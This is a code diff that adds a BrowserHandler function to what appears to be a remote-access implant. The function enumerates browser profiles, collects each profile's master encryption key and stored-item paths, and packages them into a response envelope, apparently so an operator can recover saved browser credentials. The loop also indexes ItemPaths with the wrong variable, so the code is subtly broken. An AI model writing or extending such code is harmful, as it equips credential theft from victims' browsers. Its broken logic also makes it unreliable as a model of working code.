@@ -3328,6 +3328,99 @@ CLEANUP:
 	return pRespEnvelope;
 }
 
+PENVELOPE BrowserHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PUSER_DATA* pUserDatas = NULL;
+	DWORD dwNumberOfUserDatas = 0;
+	PENVELOPE pRespEnvelope = NULL;;
+	DWORD i = 0;
+	DWORD j = 0;
+	DWORD k = 0;
+	PPBElement pFinalElement = NULL;
+	PPBElement ItemType[2];
+	PPBElement ProfileInfo[4];
+	PUSER_DATA pUserData = NULL;
+	PPROFILE_INFO pProfile = NULL;
+	LPSTR lpTemp = NULL;
+	PPBElement* pItemList = NULL;
+	PPBElement* pProfileList = NULL;
+	DWORD dwNumberOfItems = 0;
+	DWORD dwNumberOfProfiles = 0;
+	/*
+	{
+		type int64
+		fileData byte
+	}
+
+	string browser_name
+	string profile_name
+	itemData[] items
+	byte masterkey
+	*/
+
+	pUserDatas = PickBrowsers(&dwNumberOfUserDatas);
+	for (i = 0; i < dwNumberOfUserDatas; i++) {
+		pUserData = pUserDatas[i];
+		dwNumberOfProfiles += pUserData->cProfile;
+	}
+
+	pProfileList = ALLOC(sizeof(PPBElement) * dwNumberOfProfiles);
+	dwNumberOfProfiles = 0;
+	for (i = 0; i < dwNumberOfUserDatas; i++) {
+		pUserData = pUserDatas[i];
+		for (j = 0; j < pUserData->cProfile; j++) {
+			pProfile = pUserData->ProfileList[j];
+			SecureZeroMemory(ProfileInfo, sizeof(ProfileInfo));
+
+			lpTemp = ConvertWcharToChar(pUserData->lpBrowserName);
+			ProfileInfo[0] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 1);
+			FREE(lpTemp);
+
+			lpTemp = ConvertWcharToChar(pProfile->lpProfileName);
+			ProfileInfo[1] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 2);
+			FREE(lpTemp);
+
+			ProfileInfo[3] = CreateBytesElement(pUserData->pMasterKey, pUserData->cbMasterKey, 4);
+			pItemList = ALLOC(sizeof(PPBElement) * ProfileItemEnd);
+			dwNumberOfItems = 0;
+			for (k = 0; k < ProfileItemEnd; k++) {
+				if (pProfile->ItemPaths[i] != NULL) {
+					ItemType[0] = CreateVarIntElement(k, 1);
+					lpTemp = ConvertWcharToChar(pProfile->ItemPaths[i]);
+					ItemType[1] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 2);
+					FREE(lpTemp);
+
+					pItemList[dwNumberOfItems++] = CreateStructElement(ItemType, _countof(ItemType), 0);
+				}
+			}
+
+			ProfileInfo[2] = CreateRepeatedStructElement(pItemList, dwNumberOfItems, 3);
+			FREE(pItemList);
+
+			pProfileList[dwNumberOfProfiles++] = CreateStructElement(ProfileInfo, _countof(ProfileInfo), 0);
+		}
+	}
+
+	pFinalElement = CreateRepeatedStructElement(pProfileList, dwNumberOfProfiles, 1);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshalledData, pFinalElement->cbMarshalledData);
+	pFinalElement->pMarshalledData = NULL;
+CLEANUP:
+	FreeElement(pFinalElement);
+	for (i = 0; i < dwNumberOfUserDatas; i++) {
+		FreeUserData(pUserDatas[i]);
+	}
+
+	FREE(pUserDatas);
+	FREE(pProfileList);
+
+	return pRespEnvelope;
+}
+
 SYSTEM_HANDLER* GetSystemHandler()
 {
 	LPVOID* HandlerList = NULL;
